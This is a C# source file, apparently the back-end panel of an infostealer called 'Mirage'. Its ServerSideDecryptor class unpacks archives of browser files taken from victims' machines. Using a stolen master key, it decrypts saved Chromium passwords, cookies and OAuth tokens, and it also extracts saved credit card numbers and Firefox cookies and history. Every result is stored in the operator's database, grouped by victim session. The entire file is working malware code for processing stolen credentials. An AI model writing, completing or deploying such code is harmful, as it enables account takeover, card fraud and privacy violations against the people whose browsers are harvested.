using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Data.Sqlite;
using Mirage.Panel.Data;
using Mirage.Panel.Models;

namespace Mirage.Panel.Services;

public class ServerSideDecryptor
{
    private readonly AppDbContext _db;

    public ServerSideDecryptor(AppDbContext db)
    {
        _db = db;
    }

    public Session? ProcessSspArchive(byte[] archiveData, string metadata)
    {
        var session = new Session
        {
            Id = Guid.NewGuid(),
            CreatedAt = DateTime.UtcNow,
            Ip = "0.0.0.0",
            CountryCode = "XX",
            Os = "Windows",
            Username = Environment.UserName
        };

        try
        {
            using var ms = new MemoryStream(archiveData);
            using var zip = new ZipArchive(ms, ZipArchiveMode.Read);

            byte[]? masterKey = null;

            foreach (var entry in zip.Entries)
            {
                if (entry.Name == "master_key.bin")
                {
                    using var reader = new BinaryReader(entry.Open());
                    masterKey = reader.ReadBytes((int)entry.Length);
                    continue;
                }

                var parts = entry.FullName.Split('/');
                if (parts.Length < 3) continue;

                var browserName = parts[0];
                var profileName = parts[1];
                var fileName = parts[2];

                var tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
                Directory.CreateDirectory(tempPath);
                var dbPath = Path.Combine(tempPath, fileName);
                entry.ExtractToFile(dbPath, true);

                try
                {
                    switch (fileName.ToLower())
                    {
                        case "login data":
                            ProcessLoginData(dbPath, session, browserName, masterKey);
                            break;
                        case "cookies":
                            ProcessCookies(dbPath, session, browserName, masterKey);
                            break;
                        case "web data":
                            ProcessWebData(dbPath, session, browserName, masterKey);
                            break;
                        case "history":
                            ProcessHistory(dbPath, session, browserName);
                            break;
                        case "logins.json":
                        case "key4.db":
                            // Gecko files — processed together
                            break;
                        case "cookies.sqlite":
                            ProcessGeckoCookies(dbPath, session, browserName);
                            break;
                        case "places.sqlite":
                            ProcessGeckoHistory(dbPath, session, browserName);
                            break;
                    }
                }
                finally
                {
                    if (File.Exists(dbPath)) File.Delete(dbPath);
                    if (Directory.Exists(tempPath)) Directory.Delete(tempPath, true);
                }
            }

            _db.Sessions.Add(session);
            _db.SaveChanges();
            return session;
        }
        catch
        {
            return null;
        }
    }

    private void ProcessLoginData(string dbPath, Session session, string browser, byte[]? masterKey)
    {
        try
        {
            var tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            using var conn = new SqliteConnection($"Data Source={tempDb};Mode=ReadOnly");
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
            using var reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                var url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                var username = reader.IsDBNull(1) ? "" : reader.GetString(1);
                var encryptedBlob = reader.IsDBNull(2) ? null : (byte[])reader["password_value"];

                var password = DecryptAesGcm(encryptedBlob, masterKey) ?? "[encrypted]";

                _db.Passwords.Add(new Password
                {
                    Id = Guid.NewGuid(),
                    SessionId = session.Id,
                    Url = url,
                    Username = username,
                    PasswordValue = password,
                    Browser = browser
                });
            }
        }
        catch { }
        finally { if (File.Exists(dbPath)) try { File.Delete(dbPath); } catch { } }
    }

    private void ProcessCookies(string dbPath, Session session, string browser, byte[]? masterKey)
    {
        try
        {
            var tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            using var conn = new SqliteConnection($"Data Source={tempDb};Mode=ReadOnly");
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT host_key, name, path, encrypted_value FROM cookies";
            using var reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                var host = reader.IsDBNull(0) ? "" : reader.GetString(0);
                var name = reader.IsDBNull(1) ? "" : reader.GetString(1);
                var path = reader.IsDBNull(2) ? "" : reader.GetString(2);
                var encrypted = reader.IsDBNull(3) ? null : (byte[])reader["encrypted_value"];
                var value = DecryptAesGcm(encrypted, masterKey) ?? "[encrypted]";

                _db.Cookies.Add(new Cookie
                {
                    Id = Guid.NewGuid(),
                    SessionId = session.Id,
                    Domain = host,
                    Name = name,
                    Path = path,
                    Value = value,
                });
            }
        }
        catch { }
        finally { if (File.Exists(dbPath)) try { File.Delete(dbPath); } catch { } }
    }

    private void ProcessWebData(string dbPath, Session session, string browser, byte[]? masterKey)
    {
        try
        {
            var tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            using var conn = new SqliteConnection($"Data Source={tempDb};Mode=ReadOnly");
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT card_number, exp_month, exp_year, name_on_card FROM credit_cards";
            using var reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                var number = reader.IsDBNull(0) ? "" : reader.GetString(0);
                var expMonth = reader.IsDBNull(1) ? 0 : reader.GetInt32(1);
                var expYear = reader.IsDBNull(2) ? 0 : reader.GetInt32(2);
                var holder = reader.IsDBNull(3) ? "" : reader.GetString(3);

                _db.Cards.Add(new Card
                {
                    Id = Guid.NewGuid(),
                    SessionId = session.Id,
                    Number = number,
                    ExpMonth = expMonth,
                    ExpYear = expYear,
                    Holder = holder,
                });
            }

            using var tokenCmd = conn.CreateCommand();
            tokenCmd.CommandText = "SELECT service, encrypted_token FROM token_service";
            using var tokenReader = tokenCmd.ExecuteReader();

            while (tokenReader.Read())
            {
                var service = tokenReader.IsDBNull(0) ? "" : tokenReader.GetString(0);
                var encToken = tokenReader.IsDBNull(1) ? null : (byte[])tokenReader["encrypted_token"];
                var token = DecryptAesGcm(encToken, masterKey) ?? "[encrypted]";

                _db.Passwords.Add(new Password
                {
                    Id = Guid.NewGuid(),
                    SessionId = session.Id,
                    Url = "https://accounts.google.com/",
                    Username = service,
                    PasswordValue = $"OAuth:{token}",
                    Browser = browser
                });
            }
        }
        catch { }
    }

    private void ProcessHistory(string dbPath, Session session, string browser)
    {
        try
        {
            var tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            using var conn = new SqliteConnection($"Data Source={tempDb};Mode=ReadOnly");
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT url, title, visit_count FROM urls";
            using var reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                var url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                var title = reader.IsDBNull(1) ? "" : reader.GetString(1);

                _db.Passwords.Add(new Password
                {
                    Id = Guid.NewGuid(),
                    SessionId = session.Id,
                    Url = url,
                    Username = title,
                    PasswordValue = "[history]",
                    Browser = browser
                });
            }
        }
        catch { }
    }

    private void ProcessGeckoCookies(string dbPath, Session session, string browser)
    {
        try
        {
            var tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            using var conn = new SqliteConnection($"Data Source={tempDb};Mode=ReadOnly");
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT host, name, path, value FROM moz_cookies";
            using var reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                _db.Cookies.Add(new Cookie
                {
                    Id = Guid.NewGuid(),
                    SessionId = session.Id,
                    Domain = reader.IsDBNull(0) ? "" : reader.GetString(0),
                    Name = reader.IsDBNull(1) ? "" : reader.GetString(1),
                    Path = reader.IsDBNull(2) ? "" : reader.GetString(2),
                    Value = reader.IsDBNull(3) ? "" : reader.GetString(3),
                });
            }
        }
        catch { }
    }

    private void ProcessGeckoHistory(string dbPath, Session session, string browser)
    {
        try
        {
            var tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            using var conn = new SqliteConnection($"Data Source={tempDb};Mode=ReadOnly");
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT url, title FROM moz_places";
            using var reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                _db.Passwords.Add(new Password
                {
                    Id = Guid.NewGuid(),
                    SessionId = session.Id,
                    Url = reader.IsDBNull(0) ? "" : reader.GetString(0),
                    Username = reader.IsDBNull(1) ? "" : reader.GetString(1),
                    PasswordValue = "[history]",
                    Browser = browser
                });
            }
        }
        catch { }
    }

    private static string? DecryptAesGcm(byte[]? encryptedBlob, byte[]? key)
    {
        if (encryptedBlob == null || key == null || encryptedBlob.Length < 15) return null;

        try
        {
            var version = Encoding.ASCII.GetString(encryptedBlob, 0, 3);
            if (version != "v10" && version != "v11") return null;

            var nonce = encryptedBlob.AsSpan(3, 12);
            var ciphertext = encryptedBlob.AsSpan(15, encryptedBlob.Length - 15 - 16);
            var tag = encryptedBlob.AsSpan(encryptedBlob.Length - 16, 16);

            using var aes = new AesGcm(key, 16);
            var plaintext = new byte[ciphertext.Length];
            aes.Decrypt(nonce, ciphertext, tag, plaintext);

            return Encoding.UTF8.GetString(plaintext).TrimEnd('\0');
        }
        catch
        {
            return null;
        }
    }
}
